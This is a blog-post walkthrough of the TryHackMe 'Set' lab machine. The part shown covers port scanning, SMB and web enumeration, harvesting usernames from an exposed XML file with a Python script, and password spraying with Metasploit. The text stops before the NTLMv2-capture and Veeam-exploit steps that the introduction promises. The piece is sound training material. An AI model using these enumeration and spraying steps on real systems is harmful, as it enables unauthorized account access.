<!DOCTYPE html>
<html lang="en-us">
<head>
<title>Set THM Walkthrough // 0xEr3bus's Blog</title>
<link href="/favicon.ico" rel="shortcut icon"/>
<meta charset="utf-8"/>
<meta content="Hugo 0.101.0" name="generator"/>
<meta content="width=device-width, initial-scale=1" name="viewport"/>
<meta content='Shashwat "0xEr3bus" Shah' name="author"/>
<meta content="" name="description"/>
<link href="https://blog.shashwatshah.me/css/main.css" rel="stylesheet"/>
<link href='https://fonts.googleapis.com/css?family=Share Tech Mono' rel='stylesheet'>
<link href="https://blog.shashwatshah.me/css/main.min.a71a4a856378aa6dfd258fda8ad7e4b04d91989123fd42db23f699f06cfdc9a3.css" rel="stylesheet"/>
<meta content="summary" name="twitter:card"/>
<meta content="Set THM Walkthrough" name="twitter:title"/>
<meta content="Set Set is a 90 points machine on TryHackMe developed and created by 4nqr34z and Omarbdrn. The Initial Foothold is about finding usernames and password spraying; later, we grab the NTLMv2 hash using responder, crack it, and get a Winrm session. For root, we exploit Veeam One Agent Service, by customizing Metasploit’s exploit. Later in the walkthrough, we will learn unintended solutions and different techniques to grab NTLMv2 in the latest Windows Domain Controller and the latest Windows patch." name="twitter:description"/>
<meta content="Set THM Walkthrough" property="og:title"/>
<meta content="Set Set is a 90 points machine on TryHackMe developed and created by 4nqr34z and Omarbdrn. The Initial Foothold is about finding usernames and password spraying; later, we grab the NTLMv2 hash using responder, crack it, and get a Winrm session. For root, we exploit Veeam One Agent Service, by customizing Metasploit’s exploit. Later in the walkthrough, we will learn unintended solutions and different techniques to grab NTLMv2 in the latest Windows Domain Controller and the latest Windows patch." property="og:description"/>
<meta content="article" property="og:type"/>
<meta content="https://blog.shashwatshah.me/set/" property="og:url"/><meta content="posts" property="article:section"/>
<meta content="2022-05-12T00:00:00+00:00" property="article:published_time"/>
<meta content="2022-05-12T00:00:00+00:00" property="article:modified_time"/>
</head>
<body>
<header class="app-header">
<a href="https://blog.shashwatshah.me/"><img alt='Shashwat "0xEr3bus" Shah' class="app-header-avatar" src="/avatar.jpg"/></a>
<h1>0xEr3bus's Blog</h1>
<header class="app-header">
<a href="https://blog.shashwatshah.me/"><img alt='Shashwat "0xEr3bus" Shah' class="app-header-avatar" src="/avatar.jpg"/></a>
<h1>0xEr3bus's Blog</h1>
<nav class="app-header-menu">
<a class="app-header-menu-item" href="/">Home</a>

             -



          <a class="app-header-menu-item" href="/tags/">Tags</a>

             -



          <a class="app-header-menu-item" href="/about/">About</a>
</nav>
<p>A blog where I discuss about red Teaming, Windows Exploitation, Walkthroughs</p>
<div class="app-header-social">
<a class="fab fa-github-square" href="https://github.com/0xEr3bus" rel="noreferrer noopener" target="_blank"></a>
<a class="fas fa-envelope-square" href="mailto:info@shashwatshah.me" rel="noreferrer noopener" target="_blank"></a>
<a href="https://discord.com/users/504974900239400961" class="fab fa-discord" rel="noreferrer noopener" target="_blank"></a>
<a class="fab fa-twitter-square" href="https://twitter.com/0xEr3bus" rel="noreferrer noopener" target="_blank"></a>
<a href="https://app.hackthebox.com/profile/606891" rel="noreferrer noopener" target="_blank"><img src="http://www.hackthebox.eu/badge/image/606891" alt="Hack The Box"></a>
<a href="https://tryhackme.com/p/TechyShashwat" rel="noreferrer noopener" target="_blank"><img src="https://tryhackme-badges.s3.amazonaws.com/TechyShashwat.png" alt="TryHackMe"></a>

</div>
</header>
<p>A blog where I discuss about red Teaming, Windows Exploitation, Walkthroughs</p>
<div class="app-header-social">
<a href="https://github.com/0xEr3bus" rel="noreferrer noopener" target="_blank">
<svg class="icon icon-github" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
<title>My Github</title>
<path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
</a>
<a href="mailto:info@shashwatshah.me" rel="noreferrer noopener" target="_blank">
<svg class="icon icon-mail" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
<title>Send Mail</title>
<path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline>
</svg>
</a>
<a href="" rel="noreferrer noopener" target="_blank">
<svg class="icon icon-link" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
<path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
<path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
</svg>
</a>
<a href="https://twitter.com/0xEr3bus" rel="noreferrer noopener" target="_blank">
<svg class="icon icon-twitter" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
<title>My Twitter</title>
<path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
</svg>
</a>
</div>
</header>
<main class="app-container">
<article class="post">
<header class="post-header">
<h1 class="post-title">Set THM Walkthrough</h1>
<div class="post-meta">
<div>
<svg class="icon icon-calendar" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
<title>calendar</title>
<rect height="18" rx="2" ry="2" width="18" x="3" y="4"></rect><line x1="16" x2="16" y1="2" y2="6"></line><line x1="8" x2="8" y1="2" y2="6"></line><line x1="3" x2="21" y1="10" y2="10"></line>
</svg>

          May 12, 2022

        </div>
<div>
<svg class="icon icon-clock" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
<title>clock</title>
<circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>

          13 min read

        </div>
<div>
<svg class="icon icon-tag" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
<title>tag</title>
<path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" x2="7.01" y1="7" y2="7"></line>
</svg>
<a class="tag" href="https://blog.shashwatshah.me/tags/password-spray/">Password-Spray</a>
<a class="tag" href="https://blog.shashwatshah.me/tags/capture-ntlmv2/">Capture-NTLMv2</a>
<a class="tag" href="https://blog.shashwatshah.me/tags/deserialization/">Deserialization</a>
</div>
</div>
</header>
<div class="post-content">
<h1 id="set">Set</h1>
<div style="text-align:center"><img src="https://blog.shashwatshah.me/set/b24d17051176c781124f199e22213b1f.jpeg"/></div>
<p><a href="https://tryhackme.com/room/set">Set</a> is a 90 points machine on <a href="https://tryhackme.com/">TryHackMe</a> developed and created by <a href="https://tryhackme.com/p/4ndr34z">4nqr34z</a> and <a href="https://tryhackme.com/p/omarbadraan">Omarbdrn</a>. The Initial Foothold is about finding usernames and password spraying; later, we grab the NTLMv2 hash using responder, crack it, and get a Winrm session. For root, we exploit <a href="https://www.veeam.com/">Veeam One Agent Service</a>, by customizing Metasploit’s exploit. Later in the walkthrough, we will learn unintended solutions and different techniques to grab NTLMv2 in the latest Windows Domain Controller and the latest Windows patch. First, we start from the story provided by the author.</p>
<h2 id="story">Story</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>Once again you find yourself on the internal network of the Windcorp Corporation<span style="color:#f92672">.</span> This tasted so good <span style="color:#66d9ef">last</span> time you were there, you came back <span style="color:#66d9ef">for</span> more<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>However, they managed to secure the Domain Controller this time, so you need to find another server <span style="color:#f92672">and</span> on your first scan discovered <span style="color:#e6db74">"Set"</span><span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Set is used as a platform <span style="color:#66d9ef">for</span> developers <span style="color:#f92672">and</span> has had some problems in the recent past<span style="color:#f92672">.</span> They had to <span style="color:#66d9ef">reset</span> a lot of users <span style="color:#f92672">and</span> restore backups (maybe you were <span style="color:#f92672">not</span> the only hacker on their network?)<span style="color:#f92672">.</span> So they decided to make sure all users used proper passwords <span style="color:#f92672">and</span> closed of some of the loose policies<span style="color:#f92672">.</span> Can you still find a way in? Are some user more privileged than others? Or some more sloppy? And maybe you need to think outside the box a little bit to circumvent their <span style="color:#66d9ef">new</span> security controls<span style="color:#960050;background-color:#1e0010">…</span>
</span></span></code></pre></div><p>From the story, we can guess it is something about related developers. Password policy and policies have become more mature.</p>
<h2 id="recon">Recon:</h2>
<p>We will start our recon using <a href="https://github.com/RustScan/RustScan/">RustScan</a> and <a href="https://nmap.org/">Nmap</a>. I would like to use Rustscan for the ports, and for the services, we use Nmap.</p>
<h3 id="rustscan">RustScan</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>rustscan <span style="color:#f92672">--</span>range <span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">65535</span> <span style="color:#f92672">-</span>a <span style="color:#ae81ff">10.10.167.18</span> <span style="color:#f92672">--</span> <span style="color:#f92672">-</span>A <span style="color:#f92672">-</span>sC <span style="color:#f92672">-</span>sV <span style="color:#f92672">-</span>oN <span style="color:#e6db74">"Nmap_TCP.txt"</span>
</span></span></code></pre></div><p>For the command, we specify <code>--range,</code> providing all ports, from <code>1 to 65535,</code> Then we have to the append IP address of the host machine <code>-a</code>. Now for the Nmap part, we use <code>--</code>; this is used to specify that everything after it is for Nmap.</p>
<h3 id="nmap">Nmap</h3>
<p>Starting from the first tag, <code>-A</code> for aggressive scan, <code>-sC</code> for default scripts, <code>-sV</code> for enumerating versions, and  <code>-oN "Nmap_TCP.txt"</code> to output to a file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>PORT      STATE SERVICE       REASON          VERSION
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">135</span><span style="color:#f92672">/</span>tcp   open  msrpc         syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">124</span> Microsoft Windows RPC
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">443</span><span style="color:#e6db74">/tcp   open  ssl/</span>http      syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">124</span> Microsoft HTTPAPI httpd <span style="color:#ae81ff">2.0</span> (SSDP<span style="color:#f92672">/</span>UPnP)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: Not Found
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ssl<span style="color:#f92672">-</span>cert: Subject: commonName<span style="color:#f92672">=</span>set<span style="color:#f92672">.</span>windcorp<span style="color:#f92672">.</span>thm
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Subject Alternative Name: DNS:set<span style="color:#f92672">.</span>windcorp<span style="color:#f92672">.</span>thm, DNS:seth<span style="color:#f92672">.</span>windcorp<span style="color:#f92672">.</span>thm
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Issuer: commonName<span style="color:#f92672">=</span>set<span style="color:#f92672">.</span>windcorp<span style="color:#f92672">.</span>thm
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Public Key type: rsa
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Not valid before: <span style="color:#ae81ff">2020</span><span style="color:#f92672">-</span><span style="color:#ae81ff">06</span><span style="color:#f92672">-</span><span style="color:#ae81ff">07</span>T15:00:22
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Not valid after:  <span style="color:#ae81ff">2036</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#f92672">-</span><span style="color:#ae81ff">07</span>T15:10:21
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> MD5:   d0eb <span style="color:#ae81ff">717</span>c f7ef <span style="color:#ae81ff">3515</span> <span style="color:#ae81ff">00</span>d2 <span style="color:#ae81ff">5</span>d67 <span style="color:#ae81ff">4</span>beb dd69
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> SHA<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>: <span style="color:#ae81ff">9571</span> <span style="color:#ae81ff">4370</span> bd9b cc80 <span style="color:#ae81ff">08</span>ef <span style="color:#ae81ff">7</span>d1e <span style="color:#ae81ff">0</span>dfc bbc2 <span style="color:#ae81ff">251</span>c e077
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#f92672">-----</span><span style="color:#66d9ef">BEGIN</span> CERTIFICATE<span style="color:#f92672">-----</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> MIIDQTCCAimgAwIBAgIQPqCqVnulP4RF1x6k8HNXqDANBgkqhkiG9w0BAQsFADAb
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> MRkwFwYDVQQDDBBzZXQud2luZGNvcnAudGhtMB4XDTIwMDYwNzE1MDAyMloXDTM2
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> MTAwNzE1MTAyMVowGzEZMBcGA1UEAwwQc2V0LndpbmRjb3JwLnRobTCCASIwDQYJ
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> KoZIhvcNAQEBBQADggEPADCCAQoCggEBAMm4DQZ<span style="color:#f92672">+</span>hDcuel1PQ<span style="color:#f92672">+</span>DKGJXKo8dF2mR<span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> SJHlyPssa2iZx43jTijsYp<span style="color:#f92672">+</span>MxRPxSYzSuDy5M0eOIySHBN0JGWSKHLclNiwhDgAU
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> niPdrrPgreA1Hs1Zw5UN7iLEz56R7NhEPctUwZb6<span style="color:#f92672">+</span>ETjO4x91TU3JMenEF<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>ZLv3
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ss3X3MXKdv8y<span style="color:#e6db74">/KuHNPXsFf1ubioYKV3gmdsSlwLQpcATQ7LjeMdncAN62/</span>OvXpVQ
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> sFAdJkO1<span style="color:#e6db74">/LXIJquNdMzdim3PvFyPBStY6oX9sD5AiJ9/i</span>Ma91aqYjL8MXw7zPS4N
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> FKpW<span style="color:#e6db74">/Ksx1AxbG41LQieEeGwEcC6Yq2ohSUNk3/</span>RUrUA3IxN3up94t20CAwEAAaOB
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> gDB<span style="color:#f92672">+</span>MA4GA1UdDwEB<span style="color:#f92672">/</span>wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUH
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> AwEwLgYDVR0RBCcwJYIQc2V0LndpbmRjb3JwLnRobYIRc2V0aC53aW5kY29ycC50
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> aG0wHQYDVR0OBBYEFNQ2<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span>chAM4hq3nKcxQtg8Ah<span style="color:#e6db74">/1A/</span>MA0GCSqGSIb3DQEBCwUA
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> A4IBAQBB6BNqxh1cxyeeQ2D1VQ4D7nqGjp0oLNuwFFVd1Pk9f0aWWm0w1ovqOcCR
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">8</span>BrCTJJlk<span style="color:#e6db74">/FjIYUrqLBvgkyFx7cL706tEGrFtZwi1KtMg8qReBQQBYVKa7jjN8/</span>U
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> dWRrbYwNuPmmojFZ1dZWilw<span style="color:#f92672">++</span>vCSkXxIKHbP6vvZDs7XewFYCT3Snbo<span style="color:#f92672">/</span>gFc3FCdy
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> DwXM5ZQkzZnfTs6dAURqf8L7AVMxwBLow1Wl3nLuxoFQ3ypu5AyWCLROK8n5h82h
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> mJLZQ6ectkh1JzoHaP8zA0Q0hxMvflatVAUDSztATJ7bJ81yok9I1eA4Eu<span style="color:#f92672">+</span>QI<span style="color:#f92672">+</span>sO
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">2</span>yLhYxKlaeRK4AJ226n7dOxyrr8d
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_<span style="color:#f92672">-----</span><span style="color:#66d9ef">END</span> CERTIFICATE<span style="color:#f92672">-----</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span>header: Microsoft<span style="color:#f92672">-</span>HTTPAPI<span style="color:#f92672">/</span><span style="color:#ae81ff">2.0</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> tls<span style="color:#f92672">-</span>alpn: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_  http<span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_ssl<span style="color:#f92672">-</span>date: <span style="color:#ae81ff">2022</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">-</span><span style="color:#ae81ff">26</span>T15:59:38<span style="color:#f92672">+</span><span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>; <span style="color:#ae81ff">0</span>s from scanner time<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">445</span><span style="color:#f92672">/</span>tcp   open  microsoft<span style="color:#f92672">-</span>ds? syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">124</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5985</span><span style="color:#e6db74">/tcp  open  http          syn-ack ttl 124 Microsoft HTTPAPI httpd 2.0 (SSDP/</span>UPnP)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: Not Found
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span>header: Microsoft<span style="color:#f92672">-</span>HTTPAPI<span style="color:#f92672">/</span><span style="color:#ae81ff">2.0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">49666</span><span style="color:#f92672">/</span>tcp open  msrpc         syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">124</span> Microsoft Windows RPC
</span></span></code></pre></div><p>We can see that we have the standard ports open, a webserver, SMB, Winrm, and RPC from the scan. We will start from SMB, testing for anonymous login.</p>
<h3 id="smb">SMB:</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L <span style="color:#ae81ff">\\\\</span>10.10.167.18<span style="color:#ae81ff">\\</span>           
</span></span></code></pre></div><p>For SMB enumeration, we use smbclient, appending <code>-L</code> for the host IP. The output is clean and tells us that we as “anonymous,” not allowed.</p>
<p><img alt="" src="/set/20220426214114.png"/></p>
<p>For now, it’s a dead end as we don’t have any username and password. From here, we enumerate the Web Server running on 443, on HTTP(s) protocol.</p>
<h3 id="web-server">Web Server:</h3>
<p>Visiting the website, we see a <code>404</code>, a small indication that we must need a valid <code>hostname</code>.</p>
<p><img alt="" src="/set/20220426214819.png"/></p>
<p>For a valid HostName, we can check the certificate on the web. We already used Nmap with default scripts and version enumeration; we should have a few names. Looking at the scan, we indeed have a hostname.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">|</span> ssl<span style="color:#f92672">-</span><span style="color:#e6db74">cert</span>: <span style="color:#e6db74">Subject</span>: commonName<span style="color:#f92672">=</span>set<span style="color:#f92672">.</span>windcorp<span style="color:#f92672">.</span>thm
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Subject</span> <span style="color:#66d9ef">Alternative</span> <span style="color:#e6db74">Name</span>: <span style="color:#e6db74">DNS</span>:set<span style="color:#f92672">.</span>windcorp<span style="color:#f92672">.</span>thm, <span style="color:#e6db74">DNS</span>:seth<span style="color:#f92672">.</span>windcorp<span style="color:#f92672">.</span>thm
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#e6db74">Issuer</span>: commonName<span style="color:#f92672">=</span>set<span style="color:#f92672">.</span>windcorp<span style="color:#f92672">.</span>thm
</span></span></code></pre></div><p>There is an alternate method to do this, we can check the certificate on the web.</p>
<p><img alt="" src="/set/20220426215137.png"/></p>
<p>So now we add the hostname in our host file. Revisiting the page with the correct hostname, we get a perfect webpage.</p>
<p><img alt="" src="/set/20220426215552.png"/></p>
<p>Enumerating a little, we have a <code>Name Search</code> functionality, we can enter a few alphabets, and it will give a name and a few more information.</p>
<p><img alt="" src="/set/20220426215741.png"/></p>
<p>Looking at this feature, we can see a javascript function been used, <code>searchFor().</code> We open the <code>search.js.</code> file, and we see the same function.</p>
<p><img alt="" src="/set/20220426220152.png"/></p>
<p>The function points to an XML file called <code>users.xml.</code> Opening the XML file; we can see a list of usernames. There is a total of 120 usernames. We use <code>curl</code> to download the whole XML file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -k <span style="color:#e6db74">"https://set.windcorp.thm/assets/data/users.xml"</span> -o <span style="color:#e6db74">"users.xml"</span>
</span></span></code></pre></div><p>Now that we have a complete users list, we can enumerate the web using some fuzzing tools. I am going to use <code>feroxbuster.</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>feroxbuster -u <span style="color:#e6db74">"https://set.windcorp.thm/"</span> -x asp,aspx,bak,txt -w <span style="color:#e6db74">"/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt"</span> -k
</span></span></code></pre></div><p>The parameters are the usual ones. The <code>-u</code> for url, <code>-w</code> for a wordlist, <code>-x</code> for extensions. After a while, we find an engaging file, called <code>appnotes.txt.</code></p>
<pre tabindex="0"><code class="language-log" data-lang="log"> ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://set.windcorp.thm/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [asp, aspx, bak, txt]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301        2l       10w      155c https://set.windcorp.thm/assets
301        2l       10w      159c https://set.windcorp.thm/assets/img
301        2l       10w      154c https://set.windcorp.thm/forms
301        2l       10w      160c https://set.windcorp.thm/assets/data
301        2l       10w      172c https://set.windcorp.thm/assets/img/testimonials
301        2l       10w      159c https://set.windcorp.thm/assets/css
301        2l       10w      164c https://set.windcorp.thm/assets/img/team
301        2l       10w      167c https://set.windcorp.thm/assets/img/clients
301        2l       10w      169c https://set.windcorp.thm/assets/img/portfolio
301        2l       10w      158c https://set.windcorp.thm/assets/js
200        2l       21w      186c https://set.windcorp.thm/forms/readme.txt
301        2l       10w      162c https://set.windcorp.thm/assets/vendor
200        8l       24w      146c https://set.windcorp.thm/appnotes.txt
</code></pre><p>Visiting and opening the file, we saw a note from an admin. Talking about default passwords.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>Notes <span style="color:#66d9ef">for</span> the <span style="color:#66d9ef">new</span> user<span style="color:#f92672">-</span>module<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Send mail to user:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Welcome to Set<span style="color:#f92672">!</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Remember to change your default password at once<span style="color:#f92672">.</span> It is too common<span style="color:#f92672">.</span>
</span></span></code></pre></div><h2 id="initial-foothold">Initial Foothold:</h2>
<p>Now that we have a complete users list, we can spray some command passwords. First of all we will extract <code>&lt;email&gt;</code> from the XML file. For that we will use some python scripting.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>users_file <span style="color:#f92672">=</span> <span style="color:#e6db74">"users.xml"</span>
</span></span><span style="display:flex;"><span>new_users_file <span style="color:#f92672">=</span> <span style="color:#e6db74">"final_users.txt"</span>
</span></span><span style="display:flex;"><span>regex_query <span style="color:#f92672">=</span> <span style="color:#e6db74">"</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&lt;email</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&gt;(.*)</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">@windcorp</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">.thm</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&lt;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">/email</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&gt;"</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(users_file, <span style="color:#e6db74">"r"</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>	data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>	users <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(regex_query, data)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> users:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">with</span> open(new_users_file, <span style="color:#e6db74">'a'</span>) <span style="color:#66d9ef">as</span> f2:
</span></span><span style="display:flex;"><span>			f2<span style="color:#f92672">.</span>write(user <span style="color:#f92672">+</span> <span style="color:#e6db74">"</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>)
</span></span><span style="display:flex;"><span>			f2<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>	f<span style="color:#f92672">.</span>close()
</span></span></code></pre></div><p>The script will extract the values that are between the email entity. We will use the simple regex to match it. And later, we append everything to a file.</p>
<p><img alt="" src="/set/20220426223631.png"/></p>
<p>Now that we have all usernames in perfect format, we can spray passwords on SMB. We will use <strong>Metasploit</strong> for password spraying.</p>
<p><img alt="" src="/set/20220426224842.png"/></p>
<p>After a while, Metasploit indeed got the username and password.</p>
<p><img alt="" src="/set/20220427221239.png"/></p>
